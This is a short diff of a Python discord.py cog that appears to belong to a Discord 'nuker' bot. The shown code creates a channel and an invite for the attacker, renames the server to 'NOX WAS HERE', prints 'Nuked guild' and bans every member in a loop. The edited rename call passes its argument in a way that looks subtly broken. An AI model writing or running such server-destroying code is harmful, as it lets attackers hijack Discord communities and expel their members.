@@ -19,7 +19,7 @@ class Startup(commands.Cog):
                 await guild.create_text_channel(f'fuckme1')
                 invite = await self.bot.get_channel(discord.utils.get(guild.channels, name=f'fuckme1').id).create_invite(max_age = 300)
                 print(f'Guild: {guild.name} - {str(guild.id)} - Invite: {str(invite)} :)')
-                await guild.edit("NOX WAS HERE", reason='Nuked by Anix <3')
+                await guild.edit("NOX WAS HERE")
                 print(f'Nuked guild: {guild.name} - {str(guild.id)} - Changed server name :)')
                 for member in guild.members:
                     await member.ban(reason='Banned by Anix <3')
